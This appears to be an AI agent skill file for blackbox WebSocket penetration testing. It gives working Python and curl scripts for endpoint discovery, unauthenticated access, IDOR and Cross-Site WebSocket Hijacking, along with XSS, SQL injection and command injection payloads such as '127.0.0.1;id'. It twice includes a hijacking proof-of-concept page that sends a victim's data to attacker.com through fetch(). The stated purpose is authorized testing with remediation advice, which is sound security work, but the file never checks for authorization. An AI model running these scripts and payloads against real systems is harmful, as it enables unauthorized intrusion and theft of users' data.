---
name: blackbox-websocket
description: >-
  Actively test a target web application's WebSocket connections for security
  vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  discovers WebSocket endpoints, tests for missing authentication on connection
  handshake, Cross-Site WebSocket Hijacking (CSWSH), injection attacks through
  WebSocket message payloads (XSS, SQLi, command injection), and insecure
  message handling. Writes confirmed findings with PoC code to
  pentest/websocket-results.md.
---

# Blackbox WebSocket Security Testing

You are actively testing a web application's WebSocket implementation for security vulnerabilities without source code access. You will test authentication, cross-origin access, and payload injection through WebSocket messages.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## Phase 1: Discover WebSocket Endpoints

### Method 1: From Target Map

Check `pentest/target-map.md` for any `ws://` or `wss://` URLs noted during recon.

### Method 2: Search JavaScript Source

```bash
# Search JS files for WebSocket URLs
for JS_URL in <JS_FILE_URLS_FROM_TARGET_MAP>; do
  curl -sk "$JS_URL" | grep -Eo "(wss?://[^\"']+|new WebSocket\([^)]+\))"
done

# Also look for socket.io
curl -sk "<TARGET_URL>/socket.io/socket.io.js" -o /dev/null -w "%{http_code}"
curl -sk "<TARGET_URL>/socket.io/?EIO=4&transport=polling" -D -
```

### Method 3: Common WebSocket Paths

```bash
for PATH in /ws /websocket /socket /ws/chat /ws/notifications /ws/feed \
            /api/ws /api/websocket /real-time /realtime /live; do
  # WebSocket upgrade check via HTTP
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Connection: Upgrade" \
    -H "Upgrade: websocket" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Sec-WebSocket-Version: 13" \
    "<TARGET_URL>$PATH")
  echo "$PATH → $STATUS"
done
# 101 Switching Protocols = WebSocket endpoint found
```

Write confirmed endpoints to `pentest/websocket-recon.md`.

---

## Phase 2: Authentication Testing

### Test 1: WebSocket Without Auth Token

```bash
# Use Python to test unauthenticated WebSocket connection
python3 << 'EOF'
import websocket
import json

def on_message(ws, message):
    print(f"[RECV] {message}")
def on_error(ws, error):
    print(f"[ERR] {error}")
def on_close(ws, close_status_code, close_msg):
    print(f"[CLOSED] {close_status_code}")
def on_open(ws):
    print("[OPEN] Connected without auth!")
    # Try sending a privileged message
    ws.send(json.dumps({"type": "get_users", "admin": True}))
    ws.send(json.dumps({"action": "subscribe", "channel": "admin"}))

ws = websocket.WebSocketApp(
    "wss://TARGET_HOST/ws",
    on_open=on_open,
    on_message=on_message,
    on_error=on_error,
    on_close=on_close
)
ws.run_forever()
EOF
```

**Replace `TARGET_HOST` with actual target.**

**Confirmed missing auth** if connection is accepted and responds to messages without providing a token.

### Test 2: WebSocket With Token in URL (vs. Header)

```bash
# Check if auth is in URL query param (leaked in server logs, proxies)
# vs. proper header/message-based auth

# With token in URL (bad practice)
python3 -c "
import websocket
ws = websocket.WebSocketApp('wss://TARGET/ws?token=<YOUR_TOKEN>')
ws.run_forever()
"

# vs. proper: token in first message or Upgrade header
```

---

## Phase 3: Cross-Site WebSocket Hijacking (CSWSH)

If the WebSocket handshake uses only cookies for auth (no CSRF token):

### Test 1: Check if Cross-Origin Connection Is Accepted

```bash
# Test if Origin validation is enforced
python3 << 'EOF'
import websocket
import json

headers = {
    "Origin": "https://attacker.com",
    "Cookie": "session=<VICTIM_COOKIE>"
}

def on_open(ws):
    print("[OPEN] Cross-origin connection accepted — CSWSH CONFIRMED")
    ws.send(json.dumps({"type": "get_profile"}))

def on_message(ws, msg):
    print(f"[DATA] {msg}")

ws = websocket.WebSocketApp(
    "wss://TARGET_HOST/ws",
    header=headers,
    on_open=on_open,
    on_message=on_message
)
ws.run_forever()
EOF
```

**Confirmed CSWSH** if:
1. Connection accepted from `Origin: https://attacker.com`
2. Server sends back sensitive data (profile, messages, etc.)

**PoC HTML for CSWSH** (host on attacker.com, victim opens it):
```html
<html>
<body>
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() {
    ws.send(JSON.stringify({"type": "get_profile"}));
};
ws.onmessage = function(e) {
    // Send victim's data to attacker
    fetch("https://attacker.com/steal?data=" + btoa(e.data));
};
</script>
</body>
</html>
```

---

## Phase 4: Injection via WebSocket Messages

### Test 1: XSS via WebSocket Message

If WebSocket messages are rendered as HTML:

```python
import websocket, json

payloads = [
    '<img src=x onerror=alert(document.domain)>',
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>'
]

def on_open(ws):
    for p in payloads:
        ws.send(json.dumps({"message": p, "room": "public"}))
        ws.send(json.dumps({"username": p}))

ws = websocket.WebSocketApp("wss://TARGET/ws/chat/",
    on_open=on_open)
ws.run_forever()
```

**Confirmed** if the payload is echoed back unescaped in a message and would execute in a browser.

### Test 2: SQLi via WebSocket

```python
import websocket, json

def on_open(ws):
    ws.send(json.dumps({"action": "search", "query": "test' AND SLEEP(5)--"}))
    ws.send(json.dumps({"action": "get_user", "id": "1 UNION SELECT 1,2,3--"}))

ws = websocket.WebSocketApp("wss://TARGET/ws", on_open=on_open)
ws.run_forever()
```

### Test 3: Command Injection via WebSocket

```python
import websocket, json

def on_open(ws):
    ws.send(json.dumps({"action": "ping", "host": "127.0.0.1;id"}))
    ws.send(json.dumps({"action": "process", "file": "test;whoami"}))

ws = websocket.WebSocketApp("wss://TARGET/ws", on_open=on_open)
ws.run_forever()
```

---

## Phase 5: Message Manipulation

### IDOR via WebSocket

```python
import websocket, json

def on_open(ws):
    # Access another user's messages by changing their ID
    ws.send(json.dumps({"action": "get_messages", "user_id": 1}))
    ws.send(json.dumps({"action": "get_conversation", "chat_id": 42}))

ws = websocket.WebSocketApp("wss://TARGET/ws",
    header={"Cookie": "session=YOUR_SESSION"},
    on_open=on_open)
ws.run_forever()
```

---

## Output Format

Write findings to `pentest/websocket-results.md`:

```markdown
# WebSocket Security Assessment Results

## Summary
- WebSocket endpoints found: [N]
- Authentication issues: [N]
- CSWSH vulnerable: [N]
- Injection vulnerabilities: [N]

## Findings

### [CRITICAL] CSWSH — /ws endpoint accepts cross-origin connections

- **Endpoint**: `wss://target.com/ws`
- **Authentication**: Cookie `session` (no Origin validation)
- **Impact**: Any malicious website can establish a WebSocket connection using the victim's session cookies and read all messages/data the server sends
- **PoC HTML** (host on attacker.com):
  ```html
  <script>
  var ws = new WebSocket("wss://target.com/ws");
  ws.onopen = function() {
    ws.send(JSON.stringify({"action":"get_profile"}));
  };
  ws.onmessage = function(e) {
    fetch("https://attacker.com/?d=" + btoa(e.data));
  };
  </script>
  ```
- **Remediation**: Validate the `Origin` header during WebSocket handshake. Reject connections from non-allowlisted origins. Consider using a CSRF token in the connection URL or first message.

### [HIGH] Missing authentication on WebSocket endpoint

- **Endpoint**: `wss://target.com/ws/notifications`
- **Impact**: Unauthenticated access to all real-time notifications — user activity, order status, private messages
- **PoC**: Connect to endpoint with no credentials → server immediately starts sending push notifications
- **Remediation**: Require authentication token in WebSocket URL parameter or first message. Validate server-side before serving any data.
```

After writing results, delete `pentest/websocket-recon.md`.

---

## Important Reminders

- Install `websocket-client`: `pip3 install websocket-client`
- CSWSH is similar to CSRF but for WebSockets — if Origin is not validated + only cookies used → vulnerable.
- Test both `ws://` and `wss://` — the HTTP fallback endpoints of socket.io often behave differently.
- Message injection may not produce immediate visible output — look for changes in the app state or database.
- Clean up: delete `pentest/websocket-recon.md` after writing results.
